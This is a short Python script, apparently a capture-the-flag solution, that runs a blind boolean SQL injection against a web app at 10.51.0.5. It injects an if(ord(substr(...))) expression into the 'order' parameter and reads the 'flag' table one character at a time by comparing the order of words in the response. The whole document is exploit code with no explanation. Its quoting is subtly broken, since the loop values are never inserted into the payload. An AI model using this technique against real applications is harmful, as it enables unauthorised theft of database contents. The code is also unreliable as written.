import requests
url = 'http://10.51.0.5'
flag = ''
for i in range(38):
    for j in range(32,127,1):
        payload = "/?order=if(ord(substr((select flag from flag), ' + str(i) + ',1 ))like(' + str(j) +') ,price,id)"
        content = requests.get(url=url + payload)
        if content.text.find("Beer") < content.text.find("snacks"):
            flag=flag+chr(j)
            print(flag)